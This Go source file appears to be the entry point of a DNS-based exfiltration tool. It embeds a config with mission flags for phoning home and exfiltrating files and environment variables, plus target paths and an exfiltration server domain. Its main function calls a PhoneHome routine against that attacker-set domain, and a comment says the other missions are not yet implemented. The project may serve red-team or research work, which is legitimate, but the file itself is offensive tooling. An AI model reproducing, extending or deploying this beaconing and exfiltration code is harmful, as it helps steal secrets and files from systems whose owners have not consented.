package main

import (
	_ "embed"
	"github.com/pelletier/go-toml"
	"github.com/sam-bee/security-itsalwaysdns/pkg/dnsexfiltool"
)

//go:embed config.toml
var configContents string

type ApplicationConfig struct {
	Missions struct {
		PhoneHome    bool
		ExfilFiles   bool
		ExfilEnvVars bool
	}
	Objectives struct {
		FilesAndFolders []string
	}
	ExfilServer struct {
		MainDomain string
		PortNo     int
	}
}

var config = ApplicationConfig{}

func main() {
	parseConfig()

	if config.Missions.PhoneHome {
		dnsexfiltool.PhoneHome(config.ExfilServer.MainDomain)
	}

	// @todo doesn't do anything else yet
}

func parseConfig() {
	err := toml.Unmarshal([]byte(configContents), &config)
	if err != nil {
		panic(err)
	}
}
